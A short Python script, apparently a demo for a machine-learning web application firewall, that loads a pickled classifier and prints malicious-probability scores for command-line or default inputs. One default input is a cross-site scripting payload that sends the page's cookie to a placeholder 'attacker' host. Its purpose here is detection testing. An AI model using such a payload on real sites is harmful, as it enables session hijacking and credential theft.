import sys
import pickle
import numpy as np
from sklearn.feature_extraction.text import TfidfVectorizer
from sklearn.linear_model import LogisticRegression
from sklearn.pipeline import Pipeline

p = pickle.load(open('trained_waf_model', 'rb'))

if len(sys.argv) > 1:
	input_data = sys.argv[1:]
else:
	input_data = [
		'<script></script>',
		'hello.us',
		'www.google.com',
		"<script>window.location='http://attacker/?cookie='+document.cookie</script>"
	]

pred = p.predict_proba(input_data).tolist()

for i in range(len(pred)):
	print("{:0.2f}%\tmalicious:\t{}".format(pred[i][1]*100, input_data[i]))
